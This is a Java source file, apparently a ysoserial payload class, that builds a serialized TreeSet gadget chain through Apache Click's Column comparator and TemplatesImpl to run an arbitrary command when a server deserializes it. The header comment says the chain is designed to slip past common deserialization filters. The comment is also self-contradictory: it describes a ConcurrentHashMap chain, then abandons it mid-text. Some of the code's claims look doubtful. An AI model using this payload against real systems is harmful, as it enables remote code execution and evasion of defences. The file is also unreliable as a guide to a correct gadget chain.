package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.click.control.Column;
import org.apache.click.control.Table;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Click via ConcurrentHashMap entry — bypasses PriorityQueue AND HashMap filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					key.hashCode()
						Column$ColumnComparator.hashCode()  [inherits Object.hashCode]

	Wait — Column$ColumnComparator doesn't have a useful hashCode().
	Click1 uses PriorityQueue → Comparator.compare().

	Revised approach: use a different wrapper that triggers compare().
	TreeSet.readObject() → TreeMap.put() → comparator.compare() → Column chain.

	Final chain:
		ObjectInputStream.readObject()
			java.util.TreeSet.readObject()
				java.util.TreeMap.put()
					Column$ColumnComparator.compare()
						Column.getProperty()
							PropertyUtils.getObjectPropertyValue()
								Method.invoke()
									TemplatesImpl.getOutputProperties()
										-> RCE

	TreeSet is rarely filtered. Click1 uses PriorityQueue which IS filtered.

	Requires:
		click-nodeps 2.3.0
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
@Authors({ Authors.BOFEI_CHEN })
public class Click2 extends PayloadRunner implements ObjectPayload<java.util.TreeSet> {

	public java.util.TreeSet getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// Use a safe property name during construction — "class" exists on all objects
		final Column column = new Column("class");
		column.setTable(new Table());

		final Comparator comparator = column.getComparator();

		// TreeSet backed by TreeMap with ColumnComparator
		final java.util.TreeSet<Object> treeSet = new java.util.TreeSet<Object>(comparator);
		// "class" property returns Class object; its natural order works for compare
		treeSet.add(templates);
		treeSet.add(templates);

		// Now arm: swap Column.name to the dangerous property
		Reflections.setFieldValue(column, "name", "outputProperties");

		return treeSet;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Click2.class, args);
	}
}
